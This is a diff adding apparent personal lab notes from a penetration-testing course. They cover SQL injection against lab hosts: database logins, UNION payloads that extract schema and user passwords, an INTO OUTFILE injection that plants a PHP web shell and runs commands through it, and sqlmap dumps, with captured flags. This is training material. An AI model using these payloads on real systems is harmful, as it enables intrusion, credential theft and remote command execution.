@@ -1,0 +1,103 @@
+SQL injection attacks
+
+Manual sql exploitation
+
+192.168.57.16
+
+mysql -u root -p'root' -h 192.168.57.16 -P 3306 --skip-ssl-verify-server-cert
+
+SELECT plugin FROM mysql.user WHERE user = 'offsec';
+
+caching_sha2_password
+
+-----------
+192.168.57.18
+
+impacket-mssqlclient Administrator:Lab123@192.168.57.18 -windows-auth
+
+SELECT name FROM sys.databases;
+
+SELECT * FROM master.information_schema.tables;
+
+SELECT * FROM sysusers;
+
+public
+
+----------
+192.168.57.16
+
+$_POST
+
+------------
+http://192.168.57.16/search.php
+
+' ORDER BY 6-- //
+
+%' UNION SELECT 'a1', 'a2', 'a3', 'a4', 'a5' -- //
+
+%' UNION SELECT database(), user(), @@version, null, null -- //
+
+' UNION SELECT null, null, database(), user(), @@version  -- //
+
+' union select null, table_name, column_name, table_schema, null from information_schema.columns where table_schema=database() -- //
+
+' UNION SELECT null, username, password, description, null FROM users -- //
+
+same number of columns
+
+-------------------
+web application
+
+-------------
+Manual and automated code execution
+
+192.168.57.18
+
+show advanced options
+
+----------
+192.168.57.19
+
+http://192.168.57.19/search.php
+
+' ORDER BY 6-- //
+
+%' UNION SELECT 'a1', 'a2', 'a3', 'a4', 'a5' -- //
+
+' UNION SELECT "<?php system($_GET['cmd']);?>", null, null, null, null INTO OUTFILE "/var/www/html/tmp/webshell.php" -- //
+
+http://192.168.57.19/tmp/webshell.php?cmd=whoami
+
+http://192.168.57.19/tmp/webshell.php?cmd=cat%20flag.txt
+
+OS{8959ddf0a500bac9eac9d6556e89ae2f}
+
+------------------
+192.168.57.19
+
+sqlmap -u http://192.168.57.19/search.php?user=1 -p user
+
+sqlmap -u "http://192.168.57.19/search.php?id=1"
+
+GET parameter 'id' does not seem to be injectable
+all tested parameters do not appear to be injectable.
+
+failed!
+
+it worked:
+
+sqlmap -u http://192.168.57.19/blindsqli.php?user=1 -p user
+
+Parameter: user (GET)
+    Type: time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
+    Payload: user=1' AND (SELECT 3425 FROM (SELECT(SLEEP(5)))lkAv) AND 'kuky'='kuky
+
+    Type: UNION query
+    Title: Generic UNION query (NULL) - 4 columns
+    Payload: user=1' UNION ALL SELECT NULL,CONCAT(0x71627a7171,0x6c4f4b474f657675624456574e566379497672436545427841635568414a5062526a55746c506645,0x71626b7871),NULL,NULL-- -
+
+sqlmap -u http://192.168.57.19/blindsqli.php?user=1 -p user --dump
+
+OS{3ea050bc46b6ec692b2de2d20eeee5ad}
+
